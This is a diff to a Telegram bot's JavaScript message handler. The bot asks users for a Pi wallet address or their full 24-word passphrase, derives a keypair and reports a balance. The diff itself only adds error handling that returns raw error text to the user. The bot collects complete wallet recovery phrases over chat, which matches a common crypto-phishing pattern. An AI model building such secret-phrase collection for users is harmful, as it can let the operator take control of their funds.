@@ -95,40 +95,45 @@ bot.on('message', async (msg) => {
 bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
 
-    if(userSessions[chatId]?.waitingForPassphraseForBalance) {
-        const passphrase = msg.text.trim().toLocaleLowerCase();
-        const words = passphrase.split(/\s+/);
+    try {
+        if(userSessions[chatId]?.waitingForPassphraseForBalance) {
+            const passphrase = msg.text.trim().toLocaleLowerCase();
+            const words = passphrase.split(/\s+/);
 
-        if(words.length === 1) {
-            bot.sendMessage(chatId, '⏳ Checking validity of the address');
-            const accountData = await getAccountWithoutProxy(passphrase);
-            if(!accountData.balances) {
-                return bot.sendMessage(chatId, '❌ Invalid wallet. Please send address starting with G....');
-            } else {
+            if(words.length === 1) {
+                bot.sendMessage(chatId, '⏳ Checking validity of the address');
+                const accountData = await getAccountWithoutProxy(passphrase);
+                if(!accountData.balances) {
+                    return bot.sendMessage(chatId, '❌ Invalid wallet. Please send address starting with G....');
+                } else {
+                    const balanceString = getBalance(accountData);
+                    const balance = parseFloat(balanceString) - 0.98;
+                    return bot.sendMessage(chatId, `✅ Balance: ${balance.toFixed(7)} PI`);
+                }
+            }
+
+            if(words.length !== 24) {
+                return bot.sendMessage(chatId, '❌ Invalid passphrase. Please send exactly 24 words');
+            }
+
+            bot.sendMessage(chatId, '⏳ Checking Balance...');
+
+            try {
+                const kp = getKeypairFromPassphrase(passphrase)
+                bot.sendMessage(chatId, `✅ Public key: ${kp.publicKey()}`);
+
+                const accountData = await getAccountWithoutProxy(kp.publicKey());
                 const balanceString = getBalance(accountData);
                 const balance = parseFloat(balanceString) - 0.98;
-                return bot.sendMessage(chatId, `✅ Balance: ${balance.toFixed(7)} PI`);
+                bot.sendMessage(chatId, `✅ Balance: ${balance.toFixed(7)} PI`);
+            } catch(error) {
+                bot.sendMessage(chatId, `❌ Failed to fetch balance. Please try again`);
             }
-        }
-
-        if(words.length !== 24) {
-            return bot.sendMessage(chatId, '❌ Invalid passphrase. Please send exactly 24 words');
-        }
-
-        bot.sendMessage(chatId, '⏳ Checking Balance...');
-
-        try {
-            const kp = getKeypairFromPassphrase(passphrase)
-            bot.sendMessage(chatId, `✅ Public key: ${kp.publicKey()}`);
-
-            const accountData = await getAccountWithoutProxy(kp.publicKey());
-            const balanceString = getBalance(accountData);
-            const balance = parseFloat(balanceString) - 0.98;
-            bot.sendMessage(chatId, `✅ Balance: ${balance.toFixed(7)} PI`);
-        } catch(error) {
-            bot.sendMessage(chatId, `❌ Failed to fetch balance. Please try again`);
-        }
 
         delete userSessions[chatId]
+        }
+    } catch(err) {
+        delete userSessions[chatId]
+        return bot.sendMessage(chatId, `❌ Unknown error occured ${err}`);
     }
 })
